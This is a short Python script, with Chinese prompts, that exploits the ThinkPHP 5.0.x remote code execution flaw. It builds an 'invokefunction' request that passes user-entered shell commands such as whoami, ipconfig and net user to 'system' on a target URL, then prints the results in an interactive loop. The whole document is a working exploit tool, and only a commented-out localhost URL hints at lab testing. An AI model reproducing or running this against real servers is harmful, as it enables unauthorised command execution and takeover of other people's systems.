import requests

# url="http://127.0.0.1/cms/tp5.0.22/public/index.php"

headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"}

url=input('输入你要检测的url:')
while True:
    whaomi=input('输入检测的语句例如 whoami：')
    name=url
    exp=r'?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]='+str(whaomi)
    urls=name+exp
    r=requests.get(urls,headers=headers)
    if whaomi=='ipconfig':
        print(r.text)
    elif whaomi=='whoami':
        s=r.text
        print('网站权限: %s'%str(s))

    elif whaomi=='net user':
        print('该电脑存在的用户')
        print(r.text)
        print('=============')